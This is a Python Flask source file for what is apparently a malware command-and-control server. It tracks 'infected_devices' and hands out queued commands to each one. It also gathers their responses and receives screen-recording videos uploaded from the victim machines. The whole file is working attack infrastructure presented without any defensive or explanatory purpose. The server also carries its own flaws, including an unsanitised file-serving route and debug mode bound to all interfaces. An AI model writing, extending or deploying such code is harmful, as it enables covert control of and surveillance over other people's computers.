import os
import json
from flask_cors import CORS
from flask import Flask, jsonify, send_file, request

app = Flask(__name__)
CORS(app, supports_credentials=True)

SCREEN_RECORDINGS_DIR = "screen_recordings"
DATA = "data.json"

def _readf():
  """ Reads the data.json file and returns its contents as a dictionary.
  If the file does not exist, it creates it with a default structure. """
  if not os.path.exists(DATA):
    with open(DATA, "w") as file:
      json.dump({"infected_devices": {}, "messages": {}, "responses": {}}, file, indent=2)
      
  with open(DATA, "r") as file:
    return json.load(file)
def _writef(data):
  """ Writes the given data to the data.json file in a formatted manner. """
  with open(DATA, "w") as file:
    json.dump(data, file, indent=2)

def load_data(path_str):
  """ Reads the value at path specified in the data.json. """
  file = _readf()
  for key in path_str.split('.'):
    if key in file:
      file = file[key]
    else:
      return None
  return file
def write_data(path_str, value):
  """ Writes the value at path specified in the data.json. """
  root = _readf()
  current = root
  keys = path_str.split('.')

  for key in keys[:-1]:
    if key not in current or not isinstance(current[key], dict):
      current[key] = {}
    current = current[key]

  current[keys[-1]] = value
  _writef(root)
def delete_data(path_str):
  root = _readf()
  current = root
  keys = path_str.split('.')
  last_key = keys.pop()
  
  for key in keys:
    if key in current: current = current[key]
    else: return
  
  if last_key in current:
    current.pop(last_key, None) 
    _writef(root)

@app.route("/")
def home(): return send_file("templates/index.html")

@app.route("/success")
def success(): return send_file("templates/success/index.html")

@app.route("/fatal")
def fatal(): return send_file("templates/fatal/index.html")

@app.route("/auth", methods=["POST"])
def auth():
  DEVICE = request.args.get('device', '').upper()
  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
  
  message = request.get_json(force=True, silent=True) or {}
  CODE_BY_DEVICE = message.get('authcode', '')
  ACTUAL_CODE = load_data(f'infected_devices.{DEVICE}.authcode')

  if CODE_BY_DEVICE == ACTUAL_CODE:
    write_data(f'infected_devices.{DEVICE}.state', 'verified')
    return jsonify({'status': 'success'}), 200
  else: 
    write_data(f'infected_devices.{DEVICE}.state', 'unverified')
    return jsonify({'status': 'fatal', 'message': 'non-matching authcode'}), 401

@app.route("/commands", methods=["POST", "GET"])
def commands():    
  INFECTED_DEVICES = load_data("infected_devices")
  DEVICE = request.args.get('device', '').upper()
  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
  
  if request.method == 'POST':
    message = request.get_json(force=True, silent=True) or {}
    req = message.get('request', '')

    # Server Payload Handler
    if 'ping' in req:
      return jsonify({'status': 'pong'}), 200
    if 'new-device' in message:
      DATA = message['new-device']
      DEVICE_NAME = DATA.get('name', '').upper()
      OWNER = DATA.get('owner')
      AUTHCODE = DATA.get('authcode')
      if DEVICE_NAME not in INFECTED_DEVICES:
        write_data(
          f'infected_devices.{DEVICE_NAME}', 
          {'state': 'unverified', 'owner': OWNER, 'authcode': AUTHCODE}
        )
      return jsonify({'status': 'success'}), 200
    elif 'delete-all-devices' in req:
      write_data('infected_devices', {})
      return jsonify({'status': 'success'}), 200
    elif 'get-all-devices' in req:
      return jsonify({'status': 'success', 'devices': INFECTED_DEVICES}), 200
    elif 'remove-device' in req:
      if DEVICE in INFECTED_DEVICES:
        delete_data(f'infected_devices.{DEVICE}')
        delete_data(f'messages.{DEVICE}')
      return jsonify({'status': 'success'}), 200

    # WebClient Payload Handler
    if DEVICE in INFECTED_DEVICES:
      MESSAGES = load_data(f'messages.{DEVICE}') or []
      MESSAGES.append(message)
      write_data(f'messages.{DEVICE}', MESSAGES)
      return jsonify({'status': 'success'}), 200

    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
  elif request.method == 'GET':
    MESSAGES = load_data(f'messages.{DEVICE}')
    if DEVICE in INFECTED_DEVICES:
      delete_data(f'messages.{DEVICE}')
      return jsonify(MESSAGES), 200
    
    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404

@app.route("/responses", methods=["POST", "GET"])
def responses_path():
  INFECTED_DEVICES = load_data('infected_devices')
  DEVICE = request.args.get('device', '').upper()
  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
  
  if request.method == 'POST':
    # WebClient Video Submission Handler
    if request.files and request.form:
      FILENAME = request.form.get('filename')
      video = request.files['video']

      if DEVICE in FILENAME and DEVICE in INFECTED_DEVICES:
        video.save(os.path.join(SCREEN_RECORDINGS_DIR, FILENAME))
        return jsonify({'status': 'success'}), 200

      return jsonify({'status': 'fatal', 'message': 'video sent fron non-registered device.'}), 401
    else:
      # WebClient Standard Response Handler
      response = request.get_json(force=True, silent=True) or {}
      if DEVICE in INFECTED_DEVICES:
        RESPONSES = load_data(f'responses.{DEVICE}') or []
        RESPONSES.append(response)
        write_data(f'responses.{DEVICE}', RESPONSES)
        return jsonify({'status': 'success'}), 200
      
      return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
  elif request.method == 'GET':
    RESPONSES = load_data(f'responses.{DEVICE}')
    if DEVICE in INFECTED_DEVICES:
      delete_data(f'responses.{DEVICE}')
      return jsonify(RESPONSES), 200

    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404

@app.route("/resources/<path:filename>")
def serve_resource(filename):
  return send_file(f"templates/{filename}")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=8003, debug=True)